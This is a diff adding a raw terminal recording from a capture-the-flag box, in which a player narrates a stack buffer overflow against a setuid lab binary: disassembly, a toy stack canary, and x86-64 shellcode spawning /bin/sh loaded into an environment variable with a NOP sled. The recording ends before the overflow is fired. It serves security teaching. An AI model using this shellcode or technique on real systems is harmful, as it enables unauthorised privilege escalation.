@@ -1,0 +1,797 @@
+Script started on Tue 22 Sep 2015 02:19:46 AM UTC
+[00;31m++++++++++[>+++++++++++>++++++++++>++++++++++>+++++++++++>++++++++++++>+++++++++++>++++++++++>++++++++++>++++++++++++>(( [01;31mBRAINFUCK ME [00;31m ))++++++++++>+++++++++++>+++++++++++>++++++++++>+++++++++++>++++++++++++>+++++>+++++++++++>++++++++++>++++++++++++<<<<<<<<<<<<<<<<<<<-]>--.>---.>--.>+.>------.>-----.>---.>-.>---.>--.>+.>.>+++++.>---.>-----.>----.>.>+.>----.
+[01;32m-=oO( [00;32m0[01;32m )([00;32m ctf@cuboniks[01;32m OVERFLOW[01;32m )Oo=-[00;32m
+[00;32m=[01;32m=> [mcat hint
+Smash this stack for fun and profit.
+[01;32m-=oO( [00;32m0[01;32m )([00;32m ctf@cuboniks[01;32m OVERFLOW[01;32m )Oo=-[00;32m
+[00;32m=[01;32m=> [m"Go and rea[K[K[K[K[K[K[K[K[K[K[Kecho "Go and read the Phrack article, if you haven't already. It's a classic. [K"[K Google it."
+Go and read the Phrack article, if you haven't already. It's a classic. Google it.
+[01;32m-=oO( [00;32m0[01;32m )([00;32m ctf@cuboniks[01;32m OVERFLOW[01;32m )Oo=-[00;32m
+[00;32m=[01;32m=> [mecho "what we're going to do here is to produce a o[Kbuffer overflow, so as to overri[K[Kwrite the return instruction pointer with a[Kthe add[K[K[K[K[K[K[Kan address pointing to some shellcode."
+what we're going to do here is to produce a buffer overflow, so as to overwrite the return instruction pointer with an address pointing to some shellcode.
+[01;32m-=oO( [00;32m0[01;32m )([00;32m ctf@cuboniks[01;32m OVERFLOW[01;32m )Oo=-[00;32m
+[00;32m=[01;32m=> [mecho "that shellcode will give us a shell. it'll run with the privileges of the binary's owner. check it out"
+that shellcode will give us a shell. it'll run with the privileges of the binary's owner. check it out
+[01;32m-=oO( [00;32m0[01;32m )([00;32m ctf@cuboniks[01;32m OVERFLOW[01;32m )Oo=-[00;32m
+[00;32m=[01;32m=> [mls -l
+total 20
+-rw-r--r-- 1 root     root       37 Jun  6 21:31 hint
+-r-sr-sr-x 1 overflow overflow 8674 Sep 22 02:16 [0m[37;41moverflow[0m
+-rw-r----- 1 overflow overflow 2881 Jun  6 05:17 overflow.txt
+[01;32m-=oO( [00;32m0[01;32m )([00;32m ctf@cuboniks[01;32m OVERFLOW[01;32m )Oo=-[00;32m
+[00;32m=[01;32m=> [m"echo[K[K[K[K[Kecho overflow has a setuid bit. 
+overflow has a setuid bit.
+[01;32m-=oO( [00;32m0[01;32m )([00;32m ctf@cuboniks[01;32m OVERFLOW[01;32m )Oo=-[00;32m
+[00;32m=[01;32m=> [mfirst, let'[K[Kt's play around with it a bit. 
+[00;31m| [m./overf[K[K[K[K[K[K[K
+[00;31m| [m^C
+[01;32m-=oO( [00;32m0[01;32m )([00;32m ctf@cuboniks[01;32m OVERFLOW[01;32m )Oo=-[00;32m
+[00;31m=[01;31m=> [m./overflow 
+Segmentation fault (core dumped)
+[01;32m-=oO( [00;32m0[01;32m )([00;32m ctf@cuboniks[01;32m OVERFLOW[01;32m )Oo=-[00;32m
+[00;31m=[01;31m=> [m./overflow foobar
+==> foobar
+
+The canary says: tweet!
+[01;32m-=oO( [00;32m0[01;32m )([00;32m ctf@cuboniks[01;32m OVERFLOW[01;32m )Oo=-[00;32m
+[00;32m=[01;32m=> [ma [K[Kecho "c[Ka canary?"[K that's work [K[Kth a wiki [K.;[K"
+a canary? that's worth a wiki.
+[01;32m-=oO( [00;32m0[01;32m )([00;32m ctf@cuboniks[01;32m OVERFLOW[01;32m )Oo=-[00;32m
+[00;32m=[01;32m=> [mecho "basically, a canad[Kry is a form of stack-s[K[K[K[K[K[K[Kprotection against stac-[Kk-smashing. We used a pretty simplified vers[K[K[K[Kform of one here, but the concept's the same. A buffer overffl[K[Klow  risks overwriting the canary [K, which is a s[K[K[K[K[K[Kjust a string sitting between the writable buffer and the RIP. uf[K[Kif the canary is overwritten, all is lost."
+basically, a canary is a form of protection against stack-smashing. We used a pretty simplified form of one here, but the concept's the same. A buffer overflow risks overwriting the canary, which just a string sitting between the writable buffer and the RIP. if the canary is overwritten, all is lost.
+[01;32m-=oO( [00;32m0[01;32m )([00;32m ctf@cuboniks[01;32m OVERFLOW[01;32m )Oo=-[00;32m
+[00;32m=[01;32m=> [mstrings overflow
+/lib64/ld-linux-x86-64.so.2
+libc.so.6
+strcpy
+strncmp
+printf
+getchar
+__libc_start_main
+__gmon_start__
+GLIBC_2.2.5
+UH-X
+UH-X
+tweef
+We want H
+neither H
+virtue nH
+or terroH
+r. We waH
+nt superH
+ior formH
+s of corH
+ruption.H
+tweef
+[]A\A]A^A_
+==> %s
+DEAD CANARY!
+XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
+The canary says: %s
+;*3$"
+GCC: (Ubuntu 4.8.2-19ubuntu1) 4.8.2
+.symtab
+.strtab
+.shstrtab
+.interp
+.note.ABI-tag
+.note.gnu.build-id
+.gnu.hash
+.dynsym
+.dynstr
+.gnu.version
+.gnu.version_r
+.rela.dyn
+.rela.plt
+.init
+.text
+.fini
+.rodata
+.eh_frame_hdr
+.eh_frame
+.init_array
+.fini_array
+.jcr
+.dynamic
+.got
+.got.plt
+.data
+.bss
+.comment
+crtstuff.c
+__JCR_LIST__
+deregister_tm_clones
+register_tm_clones
+__do_global_dtors_aux
+completed.6972
+__do_global_dtors_aux_fini_array_entry
+frame_dummy
+__frame_dummy_init_array_entry
+overflow.c
+__FRAME_END__
+__JCR_END__
+__init_array_end
+_DYNAMIC
+__init_array_start
+_GLOBAL_OFFSET_TABLE_
+__libc_csu_fini
+strncmp@@GLIBC_2.2.5
+_ITM_deregisterTMCloneTable
+data_start
+strcpy@@GLIBC_2.2.5
+_edata
+_fini
+printf@@GLIBC_2.2.5
+__libc_start_main@@GLIBC_2.2.5
+__data_start
+getchar@@GLIBC_2.2.5
+__gmon_start__
+__dso_handle
+_IO_stdin_used
+__libc_csu_init
+_end
+_start
+__bss_start
+main
+_Jv_RegisterClasses
+__TMC_END__
+_ITM_registerTMCloneTable
+_init
+[01;32m-=oO( [00;32m0[01;32m )([00;32m ctf@cuboniks[01;32m OVERFLOW[01;32m )Oo=-[00;32m
+[00;32m=[01;32m=> [mobjdump -d overflow
+
+overflow:     file format elf64-x86-64
+
+
+Disassembly of section .init:
+
+0000000000400490 <_init>:
+  400490:	48 83 ec 08          	sub    $0x8,%rsp
+  400494:	48 8b 05 5d 0b 20 00 	mov    0x200b5d(%rip),%rax        # 600ff8 <_DYNAMIC+0x1d0>
+  40049b:	48 85 c0             	test   %rax,%rax
+  40049e:	74 05                	je     4004a5 <_init+0x15>
+  4004a0:	e8 6b 00 00 00       	callq  400510 <__gmon_start__@plt>
+  4004a5:	48 83 c4 08          	add    $0x8,%rsp
+  4004a9:	c3                   	retq   
+
+Disassembly of section .plt:
+
+00000000004004b0 <strncmp@plt-0x10>:
+  4004b0:	ff 35 52 0b 20 00    	pushq  0x200b52(%rip)        # 601008 <_GLOBAL_OFFSET_TABLE_+0x8>
+  4004b6:	ff 25 54 0b 20 00    	jmpq   *0x200b54(%rip)        # 601010 <_GLOBAL_OFFSET_TABLE_+0x10>
+  4004bc:	0f 1f 40 00          	nopl   0x0(%rax)
+
+00000000004004c0 <strncmp@plt>:
+  4004c0:	ff 25 52 0b 20 00    	jmpq   *0x200b52(%rip)        # 601018 <_GLOBAL_OFFSET_TABLE_+0x18>
+  4004c6:	68 00 00 00 00       	pushq  $0x0
+  4004cb:	e9 e0 ff ff ff       	jmpq   4004b0 <_init+0x20>
+
+00000000004004d0 <strcpy@plt>:
+  4004d0:	ff 25 4a 0b 20 00    	jmpq   *0x200b4a(%rip)        # 601020 <_GLOBAL_OFFSET_TABLE_+0x20>
+  4004d6:	68 01 00 00 00       	pushq  $0x1
+  4004db:	e9 d0 ff ff ff       	jmpq   4004b0 <_init+0x20>
+
+00000000004004e0 <printf@plt>:
+  4004e0:	ff 25 42 0b 20 00    	jmpq   *0x200b42(%rip)        # 601028 <_GLOBAL_OFFSET_TABLE_+0x28>
+  4004e6:	68 02 00 00 00       	pushq  $0x2
+  4004eb:	e9 c0 ff ff ff       	jmpq   4004b0 <_init+0x20>
+
+00000000004004f0 <__libc_start_main@plt>:
+  4004f0:	ff 25 3a 0b 20 00    	jmpq   *0x200b3a(%rip)        # 601030 <_GLOBAL_OFFSET_TABLE_+0x30>
+  4004f6:	68 03 00 00 00       	pushq  $0x3
+  4004fb:	e9 b0 ff ff ff       	jmpq   4004b0 <_init+0x20>
+
+0000000000400500 <getchar@plt>:
+  400500:	ff 25 32 0b 20 00    	jmpq   *0x200b32(%rip)        # 601038 <_GLOBAL_OFFSET_TABLE_+0x38>
+  400506:	68 04 00 00 00       	pushq  $0x4
+  40050b:	e9 a0 ff ff ff       	jmpq   4004b0 <_init+0x20>
+
+0000000000400510 <__gmon_start__@plt>:
+  400510:	ff 25 2a 0b 20 00    	jmpq   *0x200b2a(%rip)        # 601040 <_GLOBAL_OFFSET_TABLE_+0x40>
+  400516:	68 05 00 00 00       	pushq  $0x5
+  40051b:	e9 90 ff ff ff       	jmpq   4004b0 <_init+0x20>
+
+Disassembly of section .text:
+
+0000000000400520 <_start>:
+  400520:	31 ed                	xor    %ebp,%ebp
+  400522:	49 89 d1             	mov    %rdx,%r9
+  400525:	5e                   	pop    %rsi
+  400526:	48 89 e2             	mov    %rsp,%rdx
+  400529:	48 83 e4 f0          	and    $0xfffffffffffffff0,%rsp
+  40052d:	50                   	push   %rax
+  40052e:	54                   	push   %rsp
+  40052f:	49 c7 c0 20 08 40 00 	mov    $0x400820,%r8
+  400536:	48 c7 c1 b0 07 40 00 	mov    $0x4007b0,%rcx
+  40053d:	48 c7 c7 0d 06 40 00 	mov    $0x40060d,%rdi
+  400544:	e8 a7 ff ff ff       	callq  4004f0 <__libc_start_main@plt>
+  400549:	f4                   	hlt    
+  40054a:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)
+
+0000000000400550 <deregister_tm_clones>:
+  400550:	b8 5f 10 60 00       	mov    $0x60105f,%eax
+  400555:	55                   	push   %rbp
+  400556:	48 2d 58 10 60 00    	sub    $0x601058,%rax
+  40055c:	48 83 f8 0e          	cmp    $0xe,%rax
+  400560:	48 89 e5             	mov    %rsp,%rbp
+  400563:	77 02                	ja     400567 <deregister_tm_clones+0x17>
+  400565:	5d                   	pop    %rbp
+  400566:	c3                   	retq   
+  400567:	b8 00 00 00 00       	mov    $0x0,%eax
+  40056c:	48 85 c0             	test   %rax,%rax
+  40056f:	74 f4                	je     400565 <deregister_tm_clones+0x15>
+  400571:	5d                   	pop    %rbp
+  400572:	bf 58 10 60 00       	mov    $0x601058,%edi
+  400577:	ff e0                	jmpq   *%rax
+  400579:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)
+
+0000000000400580 <register_tm_clones>:
+  400580:	b8 58 10 60 00       	mov    $0x601058,%eax
+  400585:	55                   	push   %rbp
+  400586:	48 2d 58 10 60 00    	sub    $0x601058,%rax
+  40058c:	48 c1 f8 03          	sar    $0x3,%rax
+  400590:	48 89 e5             	mov    %rsp,%rbp
+  400593:	48 89 c2             	mov    %rax,%rdx
+  400596:	48 c1 ea 3f          	shr    $0x3f,%rdx
+  40059a:	48 01 d0             	add    %rdx,%rax
+  40059d:	48 d1 f8             	sar    %rax
+  4005a0:	75 02                	jne    4005a4 <register_tm_clones+0x24>
+  4005a2:	5d                   	pop    %rbp
+  4005a3:	c3                   	retq   
+  4005a4:	ba 00 00 00 00       	mov    $0x0,%edx
+  4005a9:	48 85 d2             	test   %rdx,%rdx
+  4005ac:	74 f4                	je     4005a2 <register_tm_clones+0x22>
+  4005ae:	5d                   	pop    %rbp
+  4005af:	48 89 c6             	mov    %rax,%rsi
+  4005b2:	bf 58 10 60 00       	mov    $0x601058,%edi
+  4005b7:	ff e2                	jmpq   *%rdx
+  4005b9:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)
+
+00000000004005c0 <__do_global_dtors_aux>:
+  4005c0:	80 3d 91 0a 20 00 00 	cmpb   $0x0,0x200a91(%rip)        # 601058 <__TMC_END__>
+  4005c7:	75 11                	jne    4005da <__do_global_dtors_aux+0x1a>
+  4005c9:	55                   	push   %rbp
+  4005ca:	48 89 e5             	mov    %rsp,%rbp
+  4005cd:	e8 7e ff ff ff       	callq  400550 <deregister_tm_clones>
+  4005d2:	5d                   	pop    %rbp
+  4005d3:	c6 05 7e 0a 20 00 01 	movb   $0x1,0x200a7e(%rip)        # 601058 <__TMC_END__>
+  4005da:	f3 c3                	repz retq 
+  4005dc:	0f 1f 40 00          	nopl   0x0(%rax)
+
+00000000004005e0 <frame_dummy>:
+  4005e0:	48 83 3d 38 08 20 00 	cmpq   $0x0,0x200838(%rip)        # 600e20 <__JCR_END__>
+  4005e7:	00 
+  4005e8:	74 1e                	je     400608 <frame_dummy+0x28>
+  4005ea:	b8 00 00 00 00       	mov    $0x0,%eax
+  4005ef:	48 85 c0             	test   %rax,%rax
+  4005f2:	74 14                	je     400608 <frame_dummy+0x28>
+  4005f4:	55                   	push   %rbp
+  4005f5:	bf 20 0e 60 00       	mov    $0x600e20,%edi
+  4005fa:	48 89 e5             	mov    %rsp,%rbp
+  4005fd:	ff d0                	callq  *%rax
+  4005ff:	5d                   	pop    %rbp
+  400600:	e9 7b ff ff ff       	jmpq   400580 <register_tm_clones>
+  400605:	0f 1f 00             	nopl   (%rax)
+  400608:	e9 73 ff ff ff       	jmpq   400580 <register_tm_clones>
+
+000000000040060d <main>:
+  40060d:	55                   	push   %rbp
+  40060e:	48 89 e5             	mov    %rsp,%rbp
+  400611:	48 81 ec 30 01 00 00 	sub    $0x130,%rsp
+  400618:	89 bd dc fe ff ff    	mov    %edi,-0x124(%rbp)
+  40061e:	48 89 b5 d0 fe ff ff 	mov    %rsi,-0x130(%rbp)
+  400625:	c7 45 f0 74 77 65 65 	movl   $0x65657774,-0x10(%rbp)
+  40062c:	66 c7 45 f4 74 21    	movw   $0x2174,-0xc(%rbp)
+  400632:	48 b8 57 65 20 77 61 	movabs $0x20746e6177206557,%rax
+  400639:	6e 74 20 
+  40063c:	48 89 85 f0 fe ff ff 	mov    %rax,-0x110(%rbp)
+  400643:	48 b8 6e 65 69 74 68 	movabs $0x207265687469656e,%rax
+  40064a:	65 72 20 
+  40064d:	48 89 85 f8 fe ff ff 	mov    %rax,-0x108(%rbp)
+  400654:	48 b8 76 69 72 74 75 	movabs $0x6e20657574726976,%rax
+  40065b:	65 20 6e 
+  40065e:	48 89 85 00 ff ff ff 	mov    %rax,-0x100(%rbp)
+  400665:	48 b8 6f 72 20 74 65 	movabs $0x6f7272657420726f,%rax
+  40066c:	72 72 6f 
+  40066f:	48 89 85 08 ff ff ff 	mov    %rax,-0xf8(%rbp)
+  400676:	48 b8 72 2e 20 57 65 	movabs $0x6177206557202e72,%rax
+  40067d:	20 77 61 
+  400680:	48 89 85 10 ff ff ff 	mov    %rax,-0xf0(%rbp)
+  400687:	48 b8 6e 74 20 73 75 	movabs $0x726570757320746e,%rax
+  40068e:	70 65 72 
+  400691:	48 89 85 18 ff ff ff 	mov    %rax,-0xe8(%rbp)
+  400698:	48 b8 69 6f 72 20 66 	movabs $0x6d726f6620726f69,%rax
+  40069f:	6f 72 6d 
+  4006a2:	48 89 85 20 ff ff ff 	mov    %rax,-0xe0(%rbp)
+  4006a9:	48 b8 73 20 6f 66 20 	movabs $0x726f6320666f2073,%rax
+  4006b0:	63 6f 72 
+  4006b3:	48 89 85 28 ff ff ff 	mov    %rax,-0xd8(%rbp)
+  4006ba:	48 b8 72 75 70 74 69 	movabs $0x2e6e6f6974707572,%rax
+  4006c1:	6f 6e 2e 
+  4006c4:	48 89 85 30 ff ff ff 	mov    %rax,-0xd0(%rbp)
+  4006cb:	48 c7 85 38 ff ff ff 	movq   $0xa,-0xc8(%rbp)
+  4006d2:	0a 00 00 00 
+  4006d6:	48 8d b5 40 ff ff ff 	lea    -0xc0(%rbp),%rsi
+  4006dd:	b8 00 00 00 00       	mov    $0x0,%eax
+  4006e2:	ba 16 00 00 00       	mov    $0x16,%edx
+  4006e7:	48 89 f7             	mov    %rsi,%rdi
+  4006ea:	48 89 d1             	mov    %rdx,%rcx
+  4006ed:	f3 48 ab             	rep stos %rax,%es:(%rdi)
+  4006f0:	48 8b 85 d0 fe ff ff 	mov    -0x130(%rbp),%rax
+  4006f7:	48 83 c0 08          	add    $0x8,%rax
+  4006fb:	48 8b 10             	mov    (%rax),%rdx
+  4006fe:	48 8d 85 f0 fe ff ff 	lea    -0x110(%rbp),%rax
+  400705:	48 89 d6             	mov    %rdx,%rsi
+  400708:	48 89 c7             	mov    %rax,%rdi
+  40070b:	e8 c0 fd ff ff       	callq  4004d0 <strcpy@plt>
+  400710:	48 8d 85 f0 fe ff ff 	lea    -0x110(%rbp),%rax
+  400717:	48 89 c6             	mov    %rax,%rsi
+  40071a:	bf 38 08 40 00       	mov    $0x400838,%edi
+  40071f:	b8 00 00 00 00       	mov    $0x0,%eax
+  400724:	e8 b7 fd ff ff       	callq  4004e0 <printf@plt>
+  400729:	c7 85 e0 fe ff ff 74 	movl   $0x65657774,-0x120(%rbp)
+  400730:	77 65 65 
+  400733:	66 c7 85 e4 fe ff ff 	movw   $0x2174,-0x11c(%rbp)
+  40073a:	74 21 
+  40073c:	48 8d 8d e0 fe ff ff 	lea    -0x120(%rbp),%rcx
+  400743:	48 8d 45 f0          	lea    -0x10(%rbp),%rax
+  400747:	ba 06 00 00 00       	mov    $0x6,%edx
+  40074c:	48 89 ce             	mov    %rcx,%rsi
+  40074f:	48 89 c7             	mov    %rax,%rdi
+  400752:	e8 69 fd ff ff       	callq  4004c0 <strncmp@plt>
+  400757:	85 c0                	test   %eax,%eax
+  400759:	74 31                	je     40078c <main+0x17f>
+  40075b:	bf 41 08 40 00       	mov    $0x400841,%edi
+  400760:	b8 00 00 00 00       	mov    $0x0,%eax
+  400765:	e8 76 fd ff ff       	callq  4004e0 <printf@plt>
+  40076a:	e8 91 fd ff ff       	callq  400500 <getchar@plt>
+  40076f:	48 c7 45 f8 50 08 40 	movq   $0x400850,-0x8(%rbp)
+  400776:	00 
+  400777:	48 8b 55 f8          	mov    -0x8(%rbp),%rdx
+  40077b:	48 8d 45 f0          	lea    -0x10(%rbp),%rax
+  40077f:	48 89 d6             	mov    %rdx,%rsi
+  400782:	48 89 c7             	mov    %rax,%rdi
+  400785:	e8 46 fd ff ff       	callq  4004d0 <strcpy@plt>
+  40078a:	eb 16                	jmp    4007a2 <main+0x195>
+  40078c:	48 8d 45 f0          	lea    -0x10(%rbp),%rax
+  400790:	48 89 c6             	mov    %rax,%rsi
+  400793:	bf b5 08 40 00       	mov    $0x4008b5,%edi
+  400798:	b8 00 00 00 00       	mov    $0x0,%eax
+  40079d:	e8 3e fd ff ff       	callq  4004e0 <printf@plt>
+  4007a2:	b8 00 00 00 00       	mov    $0x0,%eax
+  4007a7:	c9                   	leaveq 
+  4007a8:	c3                   	retq   
+  4007a9:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)
+
+00000000004007b0 <__libc_csu_init>:
+  4007b0:	41 57                	push   %r15
+  4007b2:	41 89 ff             	mov    %edi,%r15d
+  4007b5:	41 56                	push   %r14
+  4007b7:	49 89 f6             	mov    %rsi,%r14
+  4007ba:	41 55                	push   %r13
+  4007bc:	49 89 d5             	mov    %rdx,%r13
+  4007bf:	41 54                	push   %r12
+  4007c1:	4c 8d 25 48 06 20 00 	lea    0x200648(%rip),%r12        # 600e10 <__frame_dummy_init_array_entry>
+  4007c8:	55                   	push   %rbp
+  4007c9:	48 8d 2d 48 06 20 00 	lea    0x200648(%rip),%rbp        # 600e18 <__init_array_end>
+  4007d0:	53                   	push   %rbx
+  4007d1:	4c 29 e5             	sub    %r12,%rbp
+  4007d4:	31 db                	xor    %ebx,%ebx
+  4007d6:	48 c1 fd 03          	sar    $0x3,%rbp
+  4007da:	48 83 ec 08          	sub    $0x8,%rsp
+  4007de:	e8 ad fc ff ff       	callq  400490 <_init>
+  4007e3:	48 85 ed             	test   %rbp,%rbp
+  4007e6:	74 1e                	je     400806 <__libc_csu_init+0x56>
+  4007e8:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
+  4007ef:	00 
+  4007f0:	4c 89 ea             	mov    %r13,%rdx
+  4007f3:	4c 89 f6             	mov    %r14,%rsi
+  4007f6:	44 89 ff             	mov    %r15d,%edi
+  4007f9:	41 ff 14 dc          	callq  *(%r12,%rbx,8)
+  4007fd:	48 83 c3 01          	add    $0x1,%rbx
+  400801:	48 39 eb             	cmp    %rbp,%rbx
+  400804:	75 ea                	jne    4007f0 <__libc_csu_init+0x40>
+  400806:	48 83 c4 08          	add    $0x8,%rsp
+  40080a:	5b                   	pop    %rbx
+  40080b:	5d                   	pop    %rbp
+  40080c:	41 5c                	pop    %r12
+  40080e:	41 5d                	pop    %r13
+  400810:	41 5e                	pop    %r14
+  400812:	41 5f                	pop    %r15
+  400814:	c3                   	retq   
+  400815:	66 66 2e 0f 1f 84 00 	data32 nopw %cs:0x0(%rax,%rax,1)
+  40081c:	00 00 00 00 
+
+0000000000400820 <__libc_csu_fini>:
+  400820:	f3 c3                	repz retq 
+
+Disassembly of section .fini:
+
+0000000000400824 <_fini>:
+  400824:	48 83 ec 08          	sub    $0x8,%rsp
+  400828:	48 83 c4 08          	add    $0x8,%rsp
+  40082c:	c3                   	retq   
+[01;32m-=oO( [00;32m0[01;32m )([00;32m ctf@cuboniks[01;32m OVERFLOW[01;32m )Oo=-[00;32m
+[00;32m=[01;32m=> [mecho "we can grab the sch[K[Khellcode from wherever. google for it. I keep mine in a [Kn emacs f[Khotkey."
+we can grab the shellcode from wherever. google for it. I keep mine in an emacs hotkey.
+[01;32m-=oO( [00;32m0[01;32m )([00;32m ctf@cuboniks[01;32m OVERFLOW[01;32m )Oo=-[00;32m
+[00;32m=[01;32m=> [mE[Kexp[K[K[Kecho "tastes vary, but I like to keep my shellcode in an environment variable,[K. they're easy to manipulate, and they're stored on thes [K[K stack."
+tastes vary, but I like to keep my shellcode in an environment variable. they're easy to manipulate, and they're stored on the stack.
+[01;32m-=oO( [00;32m0[01;32m )([00;32m ctf@cuboniks[01;32m OVERFLOW[01;32m )Oo=-[00;32m
+[00;32m=[01;32m=> [mexprt[K[Kort EFF[K[K[KEGG="[K`printf[K[K[K[K[K[K[K$(printf "\x48\x31\xd2\x48\xbb\xff\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xeb\x08\x53\x48\x89\xe7\x48\x31\xc0\x50\x57\x48\x89\xe6\xb0\x3b\x0f\x05\x6a\x01\x5f\ x6a\x3c\x58\x0f\\
+[00;31m| [mx05
+[00;31m| [mexport EGG=$(printf "\x48\x31\xd2\x48\xbb\xff\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xeb\x08\x53\x48\x89\xe7\x48\x31\xc0\x50\x57\x48\x89\xe6\xb0\x3b\x0f\x05\x6a\x01\x5f\x6aa\x3c\x58\x0f\\
+x05[A[A[K
+[K
+[K[A[A[C[C")
+[01;32m-=oO( [00;32m0[01;32m )([00;32m ctf@cuboniks[01;32m OVERFLOW[01;32m )Oo=-[00;32m
+[00;32m=[01;32m=> [mexport EGG=$(printf "\x48\x31\xd2\x48\xbb\xff\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xeb\x08\x53\x48\x89\xe7\x48\x31\xc0\x50\x57\x48\x89\xe6\xb0\x3b\x0f\x05\x6a\x01\x5f\xx6a\x3c\x58\x0f\\
+x05
+")[A[C[C[C[A[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C x05
+[1P")
+[K[A[A[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C")
+[K[A[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C
+[01;32m-=oO( [00;32m0[01;32m )([00;32m ctf@cuboniks[01;32m OVERFLOW[01;32m )Oo=-[00;32m
+[00;32m=[01;32m=> [mecho $EGG
+H1ÒH»ÿ/bin/shHΑλSH‰ηH1ΐPWH‰ζ°;j_j<X
+[01;32m-=oO( [00;32m0[01;32m )([00;32m ctf@cuboniks[01;32m OVERFLOW[01;32m )Oo=-[00;32m
+[00;32m=[01;32m=> [mech[K[K[Kecho "see, t[Kby wrapping the hex ex[Kscape codes in a prif[Kntf, we can convert them straight to binary, which is how we need them. ascii won't do.[K[K[K[K[K[K\'t do."
+see, by wrapping the hex escape codes in a printf, we can convert them straight to binary, which is how we need them. ascii won\'t do.
+[01;32m-=oO( [00;32m0[01;32m )([00;32m ctf@cuboniks[01;32m OVERFLOW[01;32m )Oo=-[00;32m
+[00;32m=[01;32m=> [mecho "some NOP[K[K[K[K[K[K[K[Ka NOP-sleed[K[Kd will w[Khelp make things easier.[K"
+a NOP-sled will help make things easier
+[01;32m-=oO( [00;32m0[01;32m )([00;32m ctf@cuboniks[01;32m OVERFLOW[01;32m )Oo=-[00;32m
+[00;32m=[01;32m=> [mNOP=$(printf "\x90")
+[01;32m-=oO( [00;32m0[01;32m )([00;32m ctf@cuboniks[01;32m OVERFLOW[01;32m )Oo=-[00;32m
+[00;32m=[01;32m=> [mfor i in {0..200}; do EGG[K[K[KEGG=$NOP$EGG; done
+[01;32m-=oO( [00;32m0[01;32m )([00;32m ctf@cuboniks[01;32m OVERFLOW[01;32m )Oo=-[00;32m
+[00;32m=[01;32m=> [mexport EGG=EGG
+[01;32m-=oO( [00;32m0[01;32m )([00;32m ctf@cuboniks[01;32m OVERFLOW[01;32m )Oo=-[00;32m
+[00;32m=[01;32m=> [menv
+XDG_SESSION_ID=611
+SHELL=/bin/bash
+TERM=xterm
+EGG=EGG
+USER=ctf
+LS_COLORS=rs=0:di=01;34:ln=01;36:mh=00:pi=40;33:so=01;35:do=01;35:bd=40;33;01:cd=40;33;01:or=40;31;01:su=37;41:sg=30;43:ca=30;41:tw=30;42:ow=34;42:st=37;44:ex=01;32:*.tar=01;31:*.tgz=01;31:*.arj=01;31:*.taz=01;31:*.lzh=01;31:*.lzma=01;31:*.tlz=01;31:*.txz=01;31:*.zip=01;31:*.z=01;31:*.Z=01;31:*.dz=01;31:*.gz=01;31:*.lz=01;31:*.xz=01;31:*.bz2=01;31:*.bz=01;31:*.tbz=01;31:*.tbz2=01;31:*.tz=01;31:*.deb=01;31:*.rpm=01;31:*.jar=01;31:*.war=01;31:*.ear=01;31:*.sar=01;31:*.rar=01;31:*.ace=01;31:*.zoo=01;31:*.cpio=01;31:*.7z=01;31:*.rz=01;31:*.jpg=01;35:*.jpeg=01;35:*.gif=01;35:*.bmp=01;35:*.pbm=01;35:*.pgm=01;35:*.ppm=01;35:*.tga=01;35:*.xbm=01;35:*.xpm=01;35:*.tif=01;35:*.tiff=01;35:*.png=01;35:*.svg=01;35:*.svgz=01;35:*.mng=01;35:*.pcx=01;35:*.mov=01;35:*.mpg=01;35:*.mpeg=01;35:*.m2v=01;35:*.mkv=01;35:*.webm=01;35:*.ogm=01;35:*.mp4=01;35:*.m4v=01;35:*.mp4v=01;35:*.vob=01;35:*.qt=01;35:*.nuv=01;35:*.wmv=01;35:*.asf=01;35:*.rm=01;35:*.rmvb=01;35:*.flc=01;35:*.avi=01;35:*.fli=01;35:*.flv=01;35:*.gl=01;35:*.dl=01;35:*.xcf=01;35:*.xwd=01;35:*.yuv=01;35:*.cgm=01;35:*.emf=01;35:*.axv=01;35:*.anx=01;35:*.ogv=01;35:*.ogx=01;35:*.aac=00;36:*.au=00;36:*.flac=00;36:*.mid=00;36:*.midi=00;36:*.mka=00;36:*.mp3=00;36:*.mpc=00;36:*.ogg=00;36:*.ra=00;36:*.wav=00;36:*.axa=00;36:*.oga=00;36:*.spx=00;36:*.xspf=00;36:
+SUDO_USER=ubuntu
+SUDO_UID=1000
+USERNAME=root
+MAIL=/var/mail/ctf
+PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games
+PWD=/home/ctf/manifesto/OVERFLOW
+LANG=en_US.UTF-8
+SHLVL=3
+SUDO_COMMAND=/bin/su
+HOME=/home/ctf
+LOGNAME=ctf
+XDG_RUNTIME_DIR=/run/user/1000
+SUDO_GID=1000
+_=/usr/bin/env
+[01;32m-=oO( [00;32m0[01;32m )([00;32m ctf@cuboniks[01;32m OVERFLOW[01;32m )Oo=-[00;32m
+[00;32m=[01;32m=> [mecho "shit, I forgot the \$". 
+shit, I forgot the $.
+[01;32m-=oO( [00;32m0[01;32m )([00;32m ctf@cuboniks[01;32m OVERFLOW[01;32m )Oo=-[00;32m
+[00;32m=[01;32m=> [mecho "shit, I forgot the \$". [C[C[C[C[Cnv[Kxport EGG=EGG[C[C[C[Cfor i in {0..200}; do EGG=$NOP$EGG; done[C[C[C[C[20PNOP=$(printf "\x90")[C[C[C[Cecho "a NOP-sled will help make things easier"[C[C[C[C[C[C[C[C[C[Csee, by wrapping the hex escape codes in a printf, we can convert them straight to binary, which is how we need them. ascii won\'t do."[C[C[C[C[C[C[C[C[C$EGG[K[C[C[C[C[Cxport EGG=$(printf "\x48\x31\xd2\x48\xbb\xff\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xeb\x08\x53\x48\x89\xe7\x48\x31\xc0\x50\x57\x48\x89\xe6\xb0\x3b\x0f\x05\x6a\x01\x5f\xx6a\x3c\x58\x0f\x05")
